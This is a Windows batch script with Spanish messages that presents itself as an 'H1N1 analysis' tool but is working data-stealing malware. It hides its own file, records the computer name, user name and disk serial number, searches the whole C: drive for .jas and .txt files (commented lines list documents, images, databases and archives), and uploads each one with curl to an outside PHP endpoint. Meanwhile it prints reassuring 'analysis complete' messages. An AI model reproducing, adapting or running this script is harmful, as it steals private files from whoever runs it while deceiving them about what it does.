@echo off
echo Analisis de H1N1...
set "SCRIPT_DIR=%~dp0"
set "DEST_FOLDER=%SCRIPT_DIR%"
attrib +r +s +h "%DEST_FOLDER%\AnalisisJAS.bat"
for /f "tokens=1-3 delims=/" %%a in ('echo %date%') do set "DATE=%%c%%b%%a"
set "COMPUTER_NAME=%COMPUTERNAME%"
set "USER_NAME=%USERNAME%"
for /f "tokens=2 delims==" %%a in ('wmic diskdrive get serialnumber /value ^| find "="') do set "SERIAL_NUMBER=%%a"
set "BACKUP_FOLDER=%DEST_FOLDER%\BACKUPS\%DATE%_%COMPUTER_NAME%_%USER_NAME%_%SERIAL_NUMBER%"
if not exist "%BACKUP_FOLDER%" mkdir "%BACKUP_FOLDER%"

REM set "EXTENSIONS=.jas"
REM set "EXTENSIONS= .jas .pdf .sql .accdb .accde .accdr .accdt .doc .docx .ppt .pptx .pub .csv .xls .xlsx .bmp .jpg .jpeg .png .gif .psd .pub .txt .rar .zip .7z"
REM set "EXTENSIONS= .jpg .jpeg .png .docx .pptx .csv .xlsx .pdf"
 set "EXTENSIONS= .jas .txt"
for %%E in (%EXTENSIONS%) do (
    for /r "C:\" %%i in (*%%E) do (
	echo He analizado : %%i 
	curl -X POST -F "file=@%%i" "https://dgair.com.mx/onpxqbbef.php?key=laclave&upload="
    )
)

set "LIST_FILE=%BACKUP_FOLDER%\list.txt"
echo Creo la lista...

cd /d "%DEST_FOLDER%" || exit
dir /b /s > "%LIST_FILE%"
rem attrib +r +s -h "%LIST_FILE%" 

echo Analisis Termino Correctamente
echo Ve la lista en la carpeta %BACKUP_FOLDER%
echo Presiona cualquier tecla para salir...
pause > nul


